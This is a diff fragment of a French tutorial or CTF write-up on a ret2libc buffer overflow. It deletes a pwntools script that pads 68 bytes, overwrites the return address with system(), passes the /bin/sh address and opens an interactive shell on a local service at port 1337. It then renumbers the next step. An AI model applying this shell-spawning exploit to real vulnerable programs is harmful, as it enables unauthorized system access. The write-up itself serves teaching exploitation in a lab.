@@ -79,38 +79,9 @@ Le payload doit être:
 - 4 octets: fake return address (ex: 0xdeadbeef)
 - 4 octets: adresse de `/bin/sh` en little-endian
 
-### Étape 4: Exploitation avec Python
 
-```python
-from pwn import *
 
-# Connexion
-conn = remote('localhost', 1337)
-
-# Récupérer les adresses depuis la sortie
-output = conn.recvuntil(b'Bof\n')
-print(output.decode())
-
-# Parser les adresses (exemple, à adapter selon le format)
-# /bin/sh a : 0x804a024
-# system a : 0xf7e4c420
-
-# Extraire les adresses (méthode manuelle ou parsing)
-sh_addr = 0x804a024  # À adapter
-system_addr = 0xf7e4c420  # À adapter
-
-# Construction du payload
-payload = b'A' * 68  # Padding
-payload += p32(system_addr)  # Adresse de system()
-payload += p32(0xdeadbeef)  # Fake return address
-payload += p32(sh_addr)  # Argument: adresse de /bin/sh
-
-# Envoi
-conn.sendline(payload)
-conn.interactive()
-```
-
-### Étape 5: Exploitation automatique avec parsing
+### Étape 4: Exploitation automatique avec parsing
 
 ```python
 #!/usr/bin/env python3
